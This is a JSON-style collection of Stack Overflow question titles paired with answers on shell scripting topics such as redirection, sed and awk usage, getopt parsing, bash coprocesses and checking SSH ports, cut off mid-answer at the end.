    "Perforce: 'remove from workspace' from command line?": "Specifying a revision of either #none or #0 will remove the files:\np4 sync //depot/project/...#none\np4 sync //depot/project/...#0\nUse the -f switch to force removal of the files even if they are writeable (it won't affect files that are checked out, however):\np4 sync -f //depot/project/...#0",
    "How do I run a command in a loop until I see some string in stdout?": "There's a bunch of ways to do this, the first that came to mind was:\nOUTPUT=\"\"; \nwhile [ `echo $OUTPUT | grep -c somestring` = 0 ]; do \n  OUTPUT=`$cmd`; \ndone\nWhere $cmd is your command to execute.\nFor the heck of it, here's a BASH function version, so you can call this more easily if it's something you're wanting to invoke from an interactive shell on a regular basis:\nfunction run_until () {\n  OUTPUT=\"\";\n  while [ `echo $OUTPUT | grep -c $2` = 0 ]; do\n    OUTPUT=`$1`;\n    echo $OUTPUT;\n  done\n}\nDisclaimer: only lightly tested, may need to do some additional escaping etc. if your commands have lots of arguments or the string contains special chars.\nEDIT: Based on feedback from Adam's comment - if you don't need the output for any reason (i.e. don't want to display the output), then you can use this shorter version, with less usage of backticks and therefore less overhead:\nOUTPUT=0; \nwhile [ \"$OUTPUT\" = 0 ]; do \n  OUTPUT=`$cmd | grep -c somestring`;\ndone\nBASH function version also:\nfunction run_until () {\n  OUTPUT=0; \n  while [ \"$OUTPUT\" = 0 ]; do \n    OUTPUT=`$1 | grep -c $2`; \n  done\n}",
    "How to write integer to binary file using Bash? [duplicate]": "This is what I could come up with:\nint=65534\nprintf \"0: %.8x\" $int | xxd -r -g0 >>file\nNow depending on endianness you might want to swap the byte order:\nprintf \"0: %.8x\" $int | sed -E 's/0: (..)(..)(..)(..)/0: \\4\\3\\2\\1/' | xxd -r -g0 >>file\nExample (decoded, so it's visible):\nprintf \"0: %.8x\" 65534 | sed -E 's/0: (..)(..)(..)(..)/0: \\4\\3\\2\\1/' | xxd -r -g0 | xxd\n0000000: feff 0000                                ....\nThis is for unsigned int, if the int is signed and the value is negative you have to compute the two's complement. Simple math.",
    "Redirect Standard Output/error to log file": "For a start, it wouldn't be:\n./ShellFile.sh 2>&1 | pathToLogFile.log\nsince that would try and pipe your output through the executable file called pathToLogFile.log rather than sending the output there.\nYou need:\n./ShellFile.sh >& pathToLogFile.log\nwhich redirects both standard output and error to the file.",
    "Is it possible to use comments when the line is split with backslashes?": "The posts above do not have a direct solution. However, there is a direct solution that's actually mentioned in even older posts: How to put a line comment for a multi-line command and Commenting in a Bash script.\nThe solution I like best is:\nls -l `# long format` \\\n-a `# all files` \\\n-h `# human readable` \\\n-t `# time sort`\nYou will need both the accent grave (`) quotation and the octothorpe (#) to indicate the comment. Use them before the backslash.",
    "Pause shell script until user presses enter": "read reads from standard input by default, which is redirected to the file, so it's getting the line from the file. You can redirect back to the terminal:\nread -p \"Press Enter to continue\" </dev/tty\nAnother option would be to use a different FD for the file redirection\nwhile read -u 3\ndo\n    ...\ndone 3< test.txt",
    "bash reboot command not found": "There isn't a command @reboot. I think you're looking for\nshutdown -r now\nor (possibly)\n/sbin/reboot\nwhich will reboot your machine. However, in crontab a @reboot is a scheduled time, so that's the command it would run when your system has just rebooted... so perhaps you really just wanted\ncd my_project_path; ./start.sh",
    "use tee command to redirect output to a file in a non-existent dir": "No. You'll have to create the directory before running tee.",
    "Shell status codes in make": "I think you're looking for the $? shell variable, which gives the exit code of the previous command. For example:\n$ diff foo.txt foo.txt\n$ echo $?\n0\nTo use this in your makefile, you would have to escape the $, as in $$?:\nall:\n    diff foo.txt foo.txt ; if [ $$? -eq 0 ] ; then echo \"no differences\" ; fi\nDo note that each command in your rule body in make is run in a separate subshell. For example, the following will not work:\nall:\n    diff foo.txt foo.txt\n    if [ $$? -eq 0 ] ; then echo \"no differences\" ; fi\nBecause the diff and the if commands are executed in different shell processes. If you want to use the output status from the command, you must do so in the context of the same shell, as in my previous example.",
    "Oh-my-posh themes not working correctly with Powerline font and ConEmu": "When you see boxes, that means that the font doesn't have that specified character. e.g. there are a lot of specialized fonts that don't have every character location defined.\nRight on the oh-my-posh GitHub page, Quote:\nIn case you notice weird glyphs after installing a font of choice, make sure the glyphs are available (maybe they have a different location in the font, if so, adjust the correct $ThemeSettings icon). If it turns out the character you want is not supported, select a different font.\nAlso on the oh-my-posh GitHub page, the font used is:\nThe fonts I use are Powerline fonts, there is a great repository containing them. I use Meslo LG M Regular for Powerline Nerd Font\nIf using Meslo LG M Regular doesn't solve your problem, then you have to manually remap the icons to the correct unicode locations in your chosen font.\nFor Version 2 of Oh My Posh, you have to edit the $ThemeSettings variable. Follow the instructions on the GitHub on configuring Theme Settings. e.g.:\n$ThemeSettings.GitSymbols.BranchSymbol = [char]::ConvertFromUtf32(0xE0A0) \nFor Version 3+ of Oh My Posh, you have to edit the JSON configuration file to make the changes, e.g.:\n...\n{\n    \"type\": \"git\",\n    \"style\": \"powerline\",\n    \"powerline_symbol\": \"\\uE0B0\",\n....",
    "Copying files in ADB shell with run-as": "",
    "How to detect the last line in awk before END": "One option is to use getline function to process the file. It returns 1 on sucess, 0 on end of file and -1 on an error.\nawk '\n    FNR == 1 {\n\n        ## Process first line.\n        print FNR \": \" $0;\n\n        while ( getline == 1 ) {\n            ## Process from second to last line.\n            print FNR \": \" $0;\n        }\n\n        ## Here all lines have been processed.\n        print \"After last line\";\n    }\n' infile\nAssuming infile with this data:\none\ntwo\nthree\nfour\nfive\nOutput will be:\n1: one                                                                                                                                                                                                                                       \n2: two                                                                                                                                                                                                                                       \n3: three\n4: four\n5: five\nAfter last line",
    "How can I delete all lines before a specific string from a number of files": "This should work for you:\nsed -i '1,/Test XXX/d' file1\nsed -i '1,/Test XXX/d' file2\nor simply\nsed -i '1,/Test XXX/d' file*",
    "Why isn't this regular expression test working? [duplicate]": "The problem is that you are using quotes...\nIn bash regex, there is no need for quotes, and moreso, they should not be used (unless you are trying to match a quote (in which case you can escape it \\\")... Also if you want a space in your pattern, you must escape it, \\  (there is a space after the back-slash ...\nAlso note, that to match the entire line as being alphabetic, you must add a leading ^ and a trailing $, otherwise it will match such lines as: 123 456 abc. cat and mouse",
    "How to check if Docker is installed in a Unix shell script? [duplicate]": "Using suggestions from the answer in rickdenhaan's comment:\nif [ -x \"$(command -v docker)\" ]; then\n    echo \"Update docker\"\n    # command\nelse\n    echo \"Install docker\"\n    # command\nfi",
    "Run bash script with sh": "Well, usually you use the shebang to tell the shell to use the correct interpreter:\n#!/bin/bash\n\n# your script here\nYou have to set the script to be executable:\nchmod +x my_script.sh\nAnd let the user start it with:\n./my_script.sh\nIt seems simple than to use a wrapper script.\nYou can use jbr test to run your script with bash even if the user use sh/dash or any sh like interpreter:\n#!/bin/bash\n\nif [ -z \"$BASH_VERSION\" ]\nthen\n    exec bash \"$0\" \"$@\"\nfi\n\n# Your script here\nThis way it correctly works with either :\nsh ./my_script.sh\n\n# or\n\nbash ./my_script.sh\n\n# or\n\n./my_script.sh",
    "linux shell append variable parameters to command": "$* has all the parameters. You could iterate over them\nfor i in $*;\ndo\n    params=\" $params $d/$i\"\ndone\nyour_cmd $params",
    "Python: execute cat subprocess in parallel": "You don't need multiprocessing or threading to run subprocesses in parallel. For example:\n#!/usr/bin/env python\nfrom subprocess import Popen\n\n# run commands in parallel\nprocesses = [Popen(\"echo {i:d}; sleep 2; echo {i:d}\".format(i=i), shell=True)\n             for i in range(5)]\n# collect statuses\nexitcodes = [p.wait() for p in processes]\nit runs 5 shell commands simultaneously. Note: neither threads nor multiprocessing module are used here. There is no point to add ampersand & to the shell commands: Popen doesn't wait for the command to complete. You need to call .wait() explicitly.\nIt is convenient but it is not necessary to use threads to collect output from subprocesses:\n#!/usr/bin/env python\nfrom multiprocessing.dummy import Pool # thread pool\nfrom subprocess import Popen, PIPE, STDOUT\n\n# run commands in parallel\nprocesses = [Popen(\"echo {i:d}; sleep 2; echo {i:d}\".format(i=i), shell=True,\n                   stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)\n             for i in range(5)]\n\n# collect output in parallel\ndef get_lines(process):\n    return process.communicate()[0].splitlines()\n\noutputs = Pool(len(processes)).map(get_lines, processes)\nRelated: Python threading multiple bash subprocesses?.\nHere's code example that gets output from several subprocesses concurrently in the same thread (Python 3.8+):\n#!/usr/bin/env python3\nimport asyncio\nimport sys\nfrom subprocess import PIPE, STDOUT\n\n\nasync def get_lines(shell_command):\n    p = await asyncio.create_subprocess_shell(\n        shell_command, stdin=PIPE, stdout=PIPE, stderr=STDOUT\n    )\n    return (await p.communicate())[0].splitlines()\n\n\nasync def main():\n    # get commands output in parallel\n    coros = [\n        get_lines(\n            f'\"{sys.executable}\" -c \"print({i:d}); import time; time.sleep({i:d})\"'\n        )\n        for i in range(5)\n    ]\n    print(await asyncio.gather(*coros))\n\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\nOld (2014) answer (Python 3.4?):\n#!/usr/bin/env python3\nimport asyncio\nimport sys\nfrom asyncio.subprocess import PIPE, STDOUT\n\n@asyncio.coroutine\ndef get_lines(shell_command):\n    p = yield from asyncio.create_subprocess_shell(shell_command,\n            stdin=PIPE, stdout=PIPE, stderr=STDOUT)\n    return (yield from p.communicate())[0].splitlines()\n\nif sys.platform.startswith('win'):\n    loop = asyncio.ProactorEventLoop() # for subprocess' pipes on Windows\n    asyncio.set_event_loop(loop)\nelse:\n    loop = asyncio.get_event_loop()\n\n# get commands output in parallel\ncoros = [get_lines('\"{e}\" -c \"print({i:d}); import time; time.sleep({i:d})\"'\n                    .format(i=i, e=sys.executable)) for i in range(5)]\nprint(loop.run_until_complete(asyncio.gather(*coros)))\nloop.close()",
    "Executing Vim commands in a shell script": "I think vim -w/W and vim -s is what you are looking for.\nThe \"Vim operations/key sequence\" you could also record with vim -w test.keys input.file. You could write the test.keys too. For example, save this in the file:\nggwxjddZZ\nThis will do:\nMove to the first line,\nmove to the next word,\ndelete one character,\nmove to the next line,\ndelete the line, and\nsave and quit.\nWith this test.keys file, you could do:\nvim -s test.keys myInput.file\nYour \"myInput.file\" would be processed by the above operations, and saved. You could have that line in your shell script.\nVimGolf is using the same way to save the user's solution.",
    "Concatenate all arguments and wrap them with double quotes": "@msw has the right idea (up in the comments on the question). However, another idea to print arguments with quotes: use the implicit iteration of printf:\nfoo() { printf '\"%s\" ' \"$@\"; echo \"\"; }\n\nfoo bla \"hello ppl\"\n# => \"bla\" \"hello ppl\"",
    "How do I change a shell scripts character encoding?": "Slowly, the Unix world is moving from ASCII and other regional encodings to UTF-8. You need to be running a UTF terminal, such as a modern xterm or putty.\nIn your ~/.bash_profile set you language to be one of the UTF-8 variants.\nexport LANG=C.UTF-8\nor\nexport LANG=en_AU.UTF-8\netc..\nYou should then be able to write UTF-8 characters in the terminal, and include them in bash scripts.\n#!/bin/bash\necho \"UTF-8 is gr\u00e6at \u263a\"\nSee also: https://serverfault.com/questions/11015/utf-8-and-shell-scripts",
    "How to increment docker tag automatically?": "You could use the git revision which is unique as well. Most simple solution from the command line is a nested git-rev command:\ndocker tag <image> <image>:$(git rev-parse --short HEAD)\"\ngives you e.g.\n<image> = myImage >> myImage:67df348",
    "How do i replace [] brackets using SED": "You need to place the brackets early in the expression:\nsed 's/[][=+...-]/ /g'\nBy placing the ']' as the first character immediately after the opening bracket, it is interpreted as a member of the character set rather than a closing bracket. Placing a '[' anywhere inside the brackets makes it a member of the set.\nFor this particular character set, you also need to deal with - specially, since you are not trying to build a range of characters between [ and =. So put the - at the end of the class.",
    "Delete first line of file if it's empty": "The simplest thing in sed is:\nsed '1{/^$/d}'\nNote that this does not delete a line that contains all blanks, but only a line that contains nothing but a single newline. To get rid of blanks:\nsed '1{/^ *$/d}'\nand to eliminate all whitespace:\nsed '1{/^[[:space:]]*$/d}'\nNote that some versions of sed require a terminator inside the block, so you might need to add a semi-colon. eg sed '1{/^$/d;}'",
    "Redirecting stderr in csh": "csh is significantly more limited than bash when it comes to file redirection. In csh, you can redirect stdout with the usual > operator, you can redirect both stdout and stderr with the >& operator, you can pipe stdout and stderr with the |& operator, but there is no single operator to redirect stderr alone.\nThe usual workaround is to execute the command in a sub-shell, redirecting stdout in that sub-shell to whatever file you want (/dev/null in this case), and then use the |& operator to redirect stdout and stderr of the sub-shell to the next command in the main shell.\nIn your case, this means something like:\n( command >/dev/null ) |& grep \"^[^-]\" >&/tmp/fl\nBecause stdout is redirected to /dev/null inside the sub-shell, the |& operator will end up acting as 2>&1 in bash - since stdout is discarded in the sub-shell, nothing written to stdout will ever reach the pipe.",
    "Default values for the arguments to a Unix shell script?": "You can't, but you can assign to a local variable like this: ${parameter:-word} or use the same construct in the place you need $1. this menas use word if _paramater is null or unset\nNote, this works in bash, check your shell for the syntax of default values",
    "Grep Search all files in directory for string1 AND string2": "grep -r db-connect.php . | grep version",
    "BASH blank alias to 'cd'": "It's an option added in version 4.0 of Bash. You can set it with:\n$ shopt -s autocd\nPut that in your .bashrc file to enable it always.",
    "Laravel, dump-autoload without Shell Access": "",
    "Preserve environments vars after shell script finishes": "This is not possible by running the script. The script spawns it's own sub-shell which is lost when the script completes.\nIn order to preserve exports that you may have in your script, call it\neither as\n. myScript.sh\nor\nsource myScript.sh\nNotice the space between the . and myScript.sh; also note that \"source is a synonym for . in Bash, but not in POSIX sh, so for maximum compatibility use the period.\"",
    "Why does 2>&1 need to come before a | (pipe) but after a \"> myfile\" (redirect to file)?": "A pipeline is a |-delimited list of commands. Any redirections you specify apply to the constituent commands (simple or compound), but not to the pipeline as a whole. Each pipe chains one command's stdout to the stdin of the next by implicitly applying a redirect to each subshell before any redirects associated with a command are evaluated.\ncmd 2>&1 | less\nFirst stdout of the first subshell is redirected to the pipe from which less is reading. Next, the 2>&1 redirect is applied to the first command. Redirecting stderr to stdout works because stdout is already pointing at the pipe.\ncmd | less 2>&1\nHere, the redirect applies to less. Less's stdout and stderr both presumably started out pointed at the terminal, so 2>&1 in this case has no effect.\nIf you want a redirect to apply to an entire pipeline, to group multiple commands as part of a pipeline, or to nest pipelines, then use a command group (or any other compound command):\n{ { cmd1 >&3; cmd2; } 2>&1 | cmd3; } 3>&2\nMight be a typical example. The end result is: cmd1 and cmd2's stderr -> cmd3; cmd2's stdout -> cmd3; and cmd1 and cmd3's stderr, and cmd3's stdout -> the terminal.\nIf you use the Bash-specific |& pipe, things get stranger, because each of the pipeline's stdout redirects still occur first, but the stderr redirect actually comes last. So for example:\nf() { echo out; echo err >&2; }; f >/dev/null |& cat\nNow, counterintuitively, all output is hidden. First stdout of f goes to the pipe, next stdout of f is redirected to /dev/null, and finally, stderr is redirected to stdout (/dev/null still).\nI recommend never using |& in Bash -- it's used here for demonstration.\nMany of the obligatory redirection links",
    "Shell script argument parsing": "You want to use getopt with long and short options. An example from working code:\n# Parse arguments\nTEMP=$(getopt -n $PROGRAM_NAME -o p:P:cCkhnvVS \\\n--long domain-password:,pop3-password:\\         \n,create,cron,kill,help,no-sync-passwords,version,verbose,skip-pop3 \\\n-- \"$@\")                                                            \n\n# Die if they fat finger arguments, this program will be run as root\n[ $? = 0 ] || die \"Error parsing arguments. Try $PROGRAM_NAME --help\"       \n\neval set -- \"$TEMP\"\nwhile true; do     \n        case $1 in \n                -c|--create)\n                        MODE=\"CREATE\"; shift; continue\n                ;;                                    \n                -C|--cron)                            \n                        MODE=\"CRON\"; shift; continue  \n                ;;                                    \n                -k|--kill)                            \n                        MODE=\"KILL\"; shift; continue  \n                ;;                                    \n                -h|--help)                            \n                        usage                         \n                        exit 0                        \n                ;;                                    \n                -n|--no-sync-passwords)               \n                        SYNC_VHOST=0; shift; continue \n                ;;                                    \n                -p|--domain-password)                 \n                        DOMAIN_PASS=\"$2\"; shift; shift; continue\n                ;;                                              \n                -P|--pop3-password)                             \n                        POP3_PASS=\"$2\"; shift; shift; continue  \n                ;;                                              \n                -v|--version)                                   \n                        printf \"%s, version %s\\n\" \"$PROGRAM_NAME\" \"$PROGRAM_VERSION\"\n                        exit 0                                                      \n                ;;                                                                  \n                -v|--verbose)                                                       \n                        VERBOSE=1; shift; continue                                  \n                ;;                                                                  \n                -S|--skip-pop3)                                                     \n                        SKIP_POP=1; shift; continue                                 \n                ;;                                                                  \n                --)                                                                 \n                        # no more arguments to parse                                \n                        break                                                       \n                ;;                                                                  \n                *)                                                                  \n                        printf \"Unknown option %s\\n\" \"$1\"                           \n                        exit 1                                                      \n                ;;                                                                  \n        esac                                                                        \ndone     \nNote, die is a function that was defined previously (not shown).\nThe -n option tells getopt to report errors as the name of my program, not as getopt. -o defines a list of short options (: after an option indicates a needed argument) and --long specifies the list of long options (corresponding in order to the short options).\nThe rest is just a simple switch, calling shift appropriately to advance the argument pointer. Note, calling shift; shift; is just a die hard habit. In the currently modern world, shift 2 would probably suffice.\nThe modern getopt is pretty consistent over newer platforms, however you may encounter some portability problems on older (circa pre Redhat 9) systems. See man getopt for information about backwards compatibility. However it's unlikely that you'll run into the need for it.\nFinally, after parsing options, you can once again call:\neval set -- \"$@\"\nThis will move the argument pointer to anything else left on the command line after getopt was done parsing options. You can then just shift to keep reading them. For instance, if a command looked like this:\n./foo --option bar file1.txt file2.txt file3.txt\nDon't forget to make a handy -h / --help option to print your new fancy options once you're done. :) If you make that output help2man friendly, you have an instant man page to go with your new tool.\nEdit\nOn most distributions, you can find more example getopt code in /usr/share/doc/util-linux/examples, which should have been installed by default.",
    "How to detect if Node's process.stdout is being piped?": "The easiest way would be process.stdout.isTTY (0.8 +):\n$ node -p -e \"Boolean(process.stdout.isTTY)\"\ntrue\n$ node -p -e \"Boolean(process.stdout.isTTY)\" | cat\nfalse\n(example from the official documentation)\nAlternatively you can use the tty module for finer grained control:\nif (require('tty').isatty(1)) {\n    // terminal\n}",
    "Refer to the current directory in a shell script": "If both the scripts are in the same directory and you got the ./foo.sh: No such file or directory error then the most likely cause is that you ran the first script from a different directory than the one where they are located in. Put the following in your first script so that the call to foo.sh works irrespective of where you call the first script from:\nmy_dir=`dirname $0`\n#Call the other script\n$my_dir/foo.sh",
    "Find files and print only their parent directories": "Am I missing something here. Surely all this regex and/or looping is not necessary, a one-liner will do the job. Also \"for foo in $()\" solutions will fail when there are spaces in the path names.\nJust use dirname twice with xargs, to get parent's parent...\n# make test case\nmkdir -p /nfs/office/hht/info\nmkdir -p /nfs/office/wee1/info\ntouch /nfs/office/hht/info/.user.log\ntouch /nfs/office/wee1/info/.user.log\n\n# parent's parent approach\ncd /nfs//office/ && find . -name '.user.log' | xargs -I{} dirname {} | xargs -I{} dirname {}\n\n# alternative, have find print parent directory, so dirname only needed once...\ncd /nfs//office/ && find . -name \".user.log\" -printf \"%h\\n\"  | xargs -I{} dirname {}\nProduces\n./hht\n./wee1",
    "how to redirect stdout of 2nd process back to stdin of 1st process?": "It looks like a bash coprocess may be what you want. Look up the coproc reserved word in the bash manual.\n(Edit: adding simple usage scheme)\nIt works like this:\n# start first process as a coprocess to the current shell\ncoproc proc1\n\n# now ${COPROC[0]} contains the number of an open (input) file descriptor\n# connected to the output of proc1, and ${COPROC[1]} the number of an\n# open (output) file descriptor connected to the input of proc1.\n\n\n# start second process, connecting its input- and outputstreams\n# to the output- and inputstreams of the first process\nproc2 <&${COPROC[0]} >&${COPROC[1]}\n\n# wait on the first process to finish.\nwait $COPROC_PID\nIf you may have multiple coprocesses, give your process a name like this:\ncoproc NAME {\n    proc1\n}\nThen you can use NAME wherever COPROC was used before.\nHere is a complete example program using a ping function as proc1 and proc2:\n#!/bin/bash\n#\n# Example program using a bash coprocess to run two processes\n# with their input/output streams \n#\n\n\n#\n# A function which reads lines of input and\n# writes them back to standard output with the\n# first char cut off, waiting 5s inbetween.\n#\n# It finishes whenever an empty line is read or written,\n# or at end-of-file.\n#\n# The parameter $1 is used in debugging output on stderr.\n#\nfunction ping ()\n{\n    while read \n    do\n        local sending\n        echo \"ping $1: received '$REPLY'\" >&2\n        [[ -n $REPLY ]] || break\n        sleep 5s\n        sending=${REPLY:1}\n        echo \"ping $1: sending '$sending'\"  >&2\n        echo $sending\n        [[ -n $sending ]] || break\n    done\n    echo \"ping $1: end\" >&2\n}\n\n#\n# Start first ping process as a coprocess with name 'p1'.\n#\n\ncoproc p1 {\n    ping 1\n}\n\n# send some initial data to p1. (Not needed if one of the processes\n# starts writing before first reading.)\necho \"Hello World\" >&${p1[1]}\nsleep 2.5s\n\n#\n# Run second ping process, connecting its default input/output\n# to the default output/input of p1.\n# \nping 2 <&${p1[0]} >&${p1[1]}\n\n# wait for the coprocess to finish too.\nwait $p1_PID\nIt uses two invocations of a shell function instead of external programs, but it would work with such programs too. Here is the output (on stderr):\nping 1: received 'Hello World'\nping 1: sending 'ello World'\nping 2: received 'ello World'\nping 2: sending 'llo World'\nping 1: received 'llo World'\nping 1: sending 'lo World'\nping 2: received 'lo World'\nping 2: sending 'o World'\nping 1: received 'o World'\nping 1: sending ' World'\nping 2: received 'World'\nping 2: sending 'orld'\nping 1: received 'orld'\nping 1: sending 'rld'\nping 2: received 'rld'\nping 2: sending 'ld'\nping 1: received 'ld'\nping 1: sending 'd'\nping 2: received 'd'\nping 2: sending ''\nping 2: end\nping 1: received ''\nping 1: end",
    "how do you quit docker-compose up @ macOS?": "If you want to run docker-compose up and leave the process running without being attached to your terminal, you can run it in detached mode with docker-compose up -d.\nhttps://docs.docker.com/compose/reference/up/\nAfter doing so, you'd have to use docker-compose stop or docker-compose down to stop your running containers, since CTRL+C won't kill them.",
    "How can I quiet all the extra text when using curl within a shell script?": "-s/--silent\nSilent mode. Don't show progress meter or error messages. Makes Curl mute. If this option is used twice, the second will again disable mute.\nCURL=$(curl -s -x http://$IP -L http://icanhazip.com)",
    "Difference between korn and bash shell [closed]": "Post from UNIX.COM\nShell features\nThis table below lists most features that I think would make you choose one shell over another. It is not intended to be a definitive list and does not include every single possible feature for every single possible shell. A feature is only considered to be in a shell if in the version that comes with the operating system, or if it is available as compiled directly from the standard distribution. In particular the C shell specified below is that available on SUNOS 4.*, a considerable number of vendors now ship either tcsh or their own enhanced C shell instead (they don't always make it obvious that they are shipping tcsh.\nCode:\n                                     sh   csh  ksh  bash tcsh zsh  rc   es\nJob control                          N    Y    Y    Y    Y    Y    N    N\nAliases                              N    Y    Y    Y    Y    Y    N    N\nShell functions                      Y(1) N    Y    Y    N    Y    Y    Y\n\"Sensible\" Input/Output redirection  Y    N    Y    Y    N    Y    Y    Y\nDirectory stack                      N    Y    Y    Y    Y    Y    F    F\nCommand history                      N    Y    Y    Y    Y    Y    L    L\nCommand line editing                 N    N    Y    Y    Y    Y    L    L\nVi Command line editing              N    N    Y    Y    Y(3) Y    L    L\nEmacs Command line editing           N    N    Y    Y    Y    Y    L    L\nRebindable Command line editing      N    N    N    Y    Y    Y    L    L\nUser name look up                    N    Y    Y    Y    Y    Y    L    L\nLogin/Logout watching                N    N    N    N    Y    Y    F    F\nFilename completion                  N    Y(1) Y    Y    Y    Y    L    L\nUsername completion                  N    Y(2) Y    Y    Y    Y    L    L\nHostname completion                  N    Y(2) Y    Y    Y    Y    L    L\nHistory completion                   N    N    N    Y    Y    Y    L    L\nFully programmable Completion        N    N    N    N    Y    Y    N    N\nMh Mailbox completion                N    N    N    N(4) N(6) N(6) N    N\nCo Processes                         N    N    Y    N    N    Y    N    N\nBuiltin artithmetic evaluation       N    Y    Y    Y    Y    Y    N    N\nCan follow symbolic links invisibly  N    N    Y    Y    Y    Y    N    N\nPeriodic command execution           N    N    N    N    Y    Y    N    N\nCustom Prompt (easily)               N    N    Y    Y    Y    Y    Y    Y\nSun Keyboard Hack                    N    N    N    N    N    Y    N    N\nSpelling Correction                  N    N    N    N    Y    Y    N    N\nProcess Substitution                 N    N    N    Y(2) N    Y    Y    Y\nUnderlying Syntax                    sh   csh  sh   sh   csh  sh   rc   rc\nFreely Available                     N    N    N(5) Y    Y    Y    Y    Y\nChecks Mailbox                       N    Y    Y    Y    Y    Y    F    F\nTty Sanity Checking                  N    N    N    N    Y    Y    N    N\nCan cope with large argument lists   Y    N    Y    Y    Y    Y    Y    Y\nHas non-interactive startup file     N    Y    Y(7) Y(7) Y    Y    N    N\nHas non-login startup file           N    Y    Y(7) Y    Y    Y    N    N\nCan avoid user startup files         N    Y    N    Y    N    Y    Y    Y\nCan specify startup file             N    N    Y    Y    N    N    N    N\nLow level command redefinition       N    N    N    N    N    N    N    Y\nHas anonymous functions              N    N    N    N    N    N    Y    Y\nList Variables                       N    Y    Y    N    Y    Y    Y    Y\nFull signal trap handling            Y    N    Y    Y    N    Y    Y    Y\nFile no clobber ability              N    Y    Y    Y    Y    Y    N    F\nLocal variables                      N    N    Y    Y    N    Y    Y    Y\nLexically scoped variables           N    N    N    N    N    N    N    Y\nExceptions                           N    N    N    N    N    N    N    Y\nKey to the table above.\nY Feature can be done using this shell.\nN Feature is not present in the shell.\nF Feature can only be done by using the shells function mechanism.\nL The readline library must be linked into the shell to enable this Feature.\nNotes to the table above\n1. This feature was not in the original version, but has since become\n   almost standard.\n2. This feature is fairly new and so is often not found on many\n   versions of the shell, it is gradually making its way into\n   standard distribution.\n3. The Vi emulation of this shell is thought by many to be\n   incomplete.\n4. This feature is not standard but unofficial patches exist to\n   perform this.\n5. A version called 'pdksh' is freely available, but does not have\n   the full functionality of the AT&T version.\n6. This can be done via the shells programmable completion mechanism.\n7. Only by specifying a file via the ENV environment variable.",
    "how to check if sshd runs on a remote machine [closed]": "If you just want to check if you can connect to a host via ssh, you could simply check if port 22 is open. There are various ways to to this.\nUsing nmap (replace localhost with your target host):\n$ nmap -p22 localhost\n\nStarting Nmap 5.21 ( http://nmap.org ) at 2012-08-15 13:18 BST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000044s latency).\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 0.04 seconds\nTo use this in a script:\nif nmap -p22 localhost -oG - | grep -q 22/open; then \n    echo \"OK\"\nelse \n    echo \"NOK\"\nfi\nYou can also use netcat:\n$ nc -zv localhost 22\nConnection to localhost 22 port [tcp/ssh] succeeded!\nTo use this in a script:\nif nc -zv localhost 80 2>&1 | grep -q succeeded; then \n    echo \"OK\"\nelse \n    echo \"NOK\"\nfi\nThis is a quick check which is sufficient in most situations, however it is not fool-proof. There is no guarantee that the service listening on the remote port is actually an SSH server.\nYou could attempt a dummy connection and inspect the returned header, e.g:\n$ echo \"dummy\" | nc localhost 22\nSSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1\nProtocol mismatch.\nhowever such an approach is undesirable for various reasons. The only guaranteed way would be to establish an actual connection as you've shown in your question.",
    "Piping output to cut": "The reason is that\necho ps\njust prints out the string ps; it doesn't run the program ps. The corrected version of your command would be:\nps | grep $PPID | cut -d\" \" -f4\nEdited to add: paxdiablo points out that ps | grep $PPID includes a lot of whitespace that will get collapsed by echo $(ps | grep $PPID) (since the result of $(...), when it's not in double-quotes, is split by whitespace into separate arguments, and then echo outputs all of its arguments separated by spaces). To address this, you can use tr to \"squeeze\" repeated spaces:\nps | grep $PPID | tr -s ' ' | cut -d' ' -f5\nor you can just stick with what you had to begin with. :-)",
    "sort unique urls from log": "uniq | sort does not work: uniq removes contiguous duplicates.\nThe correct way is sort | uniq or better sort -u. Because only one process is spawned.",
    "Folder Renaming After Tar Extraction": "Manually create folder, and strip components from tarball:\narchive=my.tar.gz\nmkdir ${archive%.tar*} \ntar --extract --file=${archive} --strip-components=1 --directory=${archive%.tar*}",
    "How can I add a custom url handler on Windows. Like iTunes itms://": "If it's simple, you can do it via the command line:\nftype telnet # view current binding\nftype telnet=\\path\\to\\putty.exe %1\nOtherwise you'll need to use the registry as previously posted.",
    "R system functions always returns error 127": "",
    "Multiple git pull in one folder containing multiple repository [closed]": "Have a look at mr, a tool meant for exactly this.",
    "Shell: read a file and echo it's contents to another file": "cat aliases.sh >> ~/.zshrc",
    "alias with parameters": "In your particular case edit ~/.ssh/config (See Dave's answer below), or use:\nalias ssh_nokia='ssh -l root'\nGenerally\nssh_nokia() {\n    ssh root@\"$@\"\n}\nis equivalent to alias (will produce ssh root@1stparam 2ndparam 3rdparam \u2026).",
    "How to know the number of active threads in Puma": "To quickly answer the question, the number of threads used by a process running on a given PID, can be obtained using the following :\n% ps -h -o nlwp <pid>\nThis will just return you the total number of threads used by the process. The option -h removes the headers and the option -o nlwp formats the output of ps such that it only outputs the Number of Light Weight Processes (NLWP) or threads. Example, when only a single process puma is running and its PID is obtained with pgrep, you get:\n% ps -h -o nlwp $(pgrep puma)\n   4\nWhat is the difference between process, thread and light-weight process?\nThis question has been answered already in various places [See here, here and the excellent geekstuff article]. The quick, short and ugly version is :\na process is essentially any running instance of a program.\na thread is a flow of execution of the process. A process containing multiple execution-flows is known as multi-threaded process and shares its resources amongst its threads (memory, open files, io, ...). The Linux kernel has no knowledge of what threads are and only knows processes. In the past, multi-threading was handled on a user level and not kernel level. This made it hard for the kernel to do proper process management.\nEnter lightweight processes (LWP). This is essentially the answer to the issue with threads. Each thread is considered to be an LWP on kernel level. The main difference between a process and an LWP is that the LWP shares resources. In other words, an Light Weight Process is kernel-speak for what users call a thread.\nCan ps show information about threads or LWP's?\nThe ps command or process status command provides information about the currently running processes including their corresponding LWPs or threads. To do this, it makes use of the /proc directory which is a virtual filesystem and regarded as the control and information centre of the kernel. [See here and here].\nBy default ps will not give you any information about the LWPs, however, adding the option -L and -m to the command generally does the trick.\nman ps :: THREAD DISPLAY\n   H      Show threads as if they were processes.\n   -L     Show threads, possibly with LWP and NLWP columns.\n   m      Show threads after processes.\n   -m     Show threads after processes.\n   -T     Show threads, possibly with SPID column.\nFor a single process puma with pid given by pgrep puma\n% ps -fL $(pgrep puma)\nUID        PID  PPID   LWP  C NLWP STIME TTY      STAT   TIME CMD\nkvantour  2160  2876  2160  0    4 15:22 pts/39   Sl+    0:00 ./puma\nkvantour  